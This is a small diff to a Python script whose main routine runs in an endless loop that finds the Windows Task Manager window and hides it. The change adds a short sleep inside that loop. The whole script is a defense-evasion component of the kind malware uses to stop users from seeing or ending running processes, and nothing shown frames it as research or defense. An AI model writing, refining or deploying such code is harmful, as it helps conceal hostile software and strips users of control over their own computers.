@@ -1,4 +1,6 @@
 import win32gui, win32con, win32api
+from time import sleep
+
 
 def getFileDescription(windows_exe): # find description of exe for different languages
     try:
@@ -18,7 +20,8 @@ def disableTaskmgr():
     while(1):
         taskmgr = win32gui.FindWindow(None,taskmgrtitle)
         win32gui.ShowWindow(taskmgr , win32con.SW_HIDE)
-
+        
+        sleep(0.5)
         
 if __name__ == '__main__':
     disableTaskmgr()
